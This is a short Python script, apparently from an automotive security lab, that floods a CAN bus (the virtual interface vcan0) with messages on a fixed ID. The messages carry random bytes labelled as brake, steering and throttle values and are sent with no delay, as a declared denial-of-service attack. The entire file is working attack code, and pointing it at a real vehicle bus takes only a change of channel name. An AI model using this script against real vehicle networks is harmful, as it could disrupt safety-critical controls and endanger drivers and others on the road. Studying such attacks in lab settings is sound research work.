import can
import random
import time

def send_dos_can_messages():
    # Initialize the virtual CAN bus (vcan0)
    bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

    print("Starting Denial of Service attack. Press Ctrl+C to stop.")

    try:
        while True:
            # Generate random data values
            random_data = [
                random.randint(0, 255),  # Random value for brake
                random.randint(0, 255),  # Random value for steering
                random.randint(0, 255)   # Random value for throttle
            ]

            # Create a CAN message with random data
            message = can.Message(
                arbitration_id=0x110,  # Fixed CAN ID for the attack
                data=random_data,
                is_extended_id=False
            )

            # Send the CAN message
            bus.send(message)
            print(f"Sent CAN message: ID={message.arbitration_id}, Data={random_data}")

            # No delay for fastest frequency possible
            
    except KeyboardInterrupt:
        print("\nDoS attack interrupted. Stopping.")
    except can.CanError as e:
        print(f"CAN Error occurred: {e}")
    finally:
        bus.shutdown()  # Clean up the CAN bus connection

if __name__ == "__main__":
    send_dos_can_messages()
